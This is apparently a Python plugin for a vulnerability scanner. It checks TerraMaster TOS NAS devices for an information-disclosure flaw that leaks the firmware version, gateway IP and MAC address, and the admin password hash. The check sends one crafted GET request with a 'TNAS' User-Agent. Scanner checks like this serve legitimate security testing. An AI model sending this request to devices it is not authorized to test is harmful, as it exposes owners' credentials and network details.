# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "TerraMaster TOS信息泄露漏洞",
        "description": "该漏洞，可导致TOS固件版本、默认网关接口的IP和MAC地址以及管理员密码的散列暴露",
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./module/api.php?mobile/webNasIPS',
            timeout=15,
            headers={"User-Agent": "TNAS"}
        )
        if 'successful' in r.text:
            return {
                "LoopholeInfo": {"app": "TerraMaster TOS", "name": "TerraMaster TOS信息泄露漏洞"}
            }
